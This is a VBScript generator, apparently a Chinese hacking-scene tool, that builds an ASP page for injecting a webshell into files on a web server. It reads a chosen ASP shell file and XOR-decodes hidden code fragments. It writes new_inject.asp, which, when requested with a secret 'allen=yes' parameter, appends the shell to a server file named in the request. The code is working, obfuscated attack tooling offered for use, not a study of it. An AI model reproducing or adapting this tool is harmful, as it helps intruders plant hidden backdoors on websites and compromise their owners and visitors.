msgbox "Made by wE|wE|"
on error resume next
dim testfile,fs,thisfile,line,injectfile(3),newinject
testfile=inputbox("����aspshell���ļ���")
set fs=CreateObject("scripting.filesystemobject")
set thisfile=fs.OpenTextFile(testfile)
set newinject=fs.opentextfile("new_inject.asp",2,True,0)

'����inject.asp�����н϶��"��""��������XOR�������

'injectfile(0)��inject.asp��ͷ5��
injectfile(0)="=$!hg!Sdptdru)#`mmdo#(<#xdr#!uidoehl!udrughmd-gr-uihrghmdudrughmd<Rdswds/L`qQ`ui)##'Sdptdru)#q`ui#('##(rdu!gr<rdswds/Bsd`udNckdbu)#rbshquhof/ghmdrxrudlnckdbu#(rdu!uihrghmd<gr/NqdoUdyuGhmd)udrughmd-9-Ustd-1("

'injectfile(1)��inject.asp��β5��
injectfile(1)="uihrghmd/bmnrdSdrqnord/vshud!#rtbbdde #dmrd!Sdrqnord/vshud!#=gnsl!lduine<&QNRU&!`buhno<&#'Sdptdru/RdswdsW`sh`cmdr)#TSM#('#>`mmdo<xdr&?#Sdrqnord/vshud!#=hoqtu!uxqd<&udyu&!o`ld<&q`ui&!w`mtd<&#'Sdptdru)#q`ui#('#&?#Sdrqnord/vshud!#=hoqtu!o`ld<&rtclhu&!uxqd<&rtclhu&!w`mtd<&nj&!?=.gnsl?#doe!hg$?"

'��ȡaspshell�ļ����ݣ�������������
injectfile(2)=thisfile.readall & vbcrlf

'injectfile(3)��д��inject.asp��Ľ������
injectfile(3)="ehl!`-b-k-hgns!k<1!un!3!!b<##!!Gns!h!<!0!Un!Mdo)ridmm(!!!!`!<!@rb)Lhe)ridmm-!h-!0((!!!!`!<!`!Yns!0!!!!Hg!`!<!1!Uido!`!<!0!!!!b!<!b!'!Bis)`(!!Odyu!!ridmm<bodyu"

'��/����
dim a,c,j,i
for j=0 to 3
  c=""
  For i = 1 To Len(injectfile(j))
    a = Asc(Mid(injectfile(j), i, 1))
    a = a Xor 1
    If a = 0 Then a = 1
    c = c & Chr(a)
  Next
  injectfile(j)=c
next

'д��inject.asp�ļ���ͷ��5��
newinject.write(injectfile(0))

'д������aspshell����
newinject.writeline(vbcrlf)
newinject.writeline(vbcrlf & "dim shell")
newinject.writeline("shell=" & chr(34) & "=$!hg!Sdptdru)#`mmdo#(<#0#!uido!$?" & injectfile(2) & "=$!doe!hg!$?" & chr(34) & vbcrlf )

'д��������
newinject.write(injectfile(3) & vbcrlf)

'д��"ע��"���
line="thisfile.WriteLine(vbcrlf & vbcrlf & shell)"
newinject.writeline(line)

'д��inject.asp�ļ���β��5��
newinject.write(injectfile(1))

set fs=nothing
set thisfile=nothing
set newinject=nothing

if err=0 then
msgbox "�ɹ�����new_inject.asp�ļ�"
msgbox "��ӭ����ָ�̣�hhjjww520@hotmail.com"
else
msgbox "����ʧ��"
end if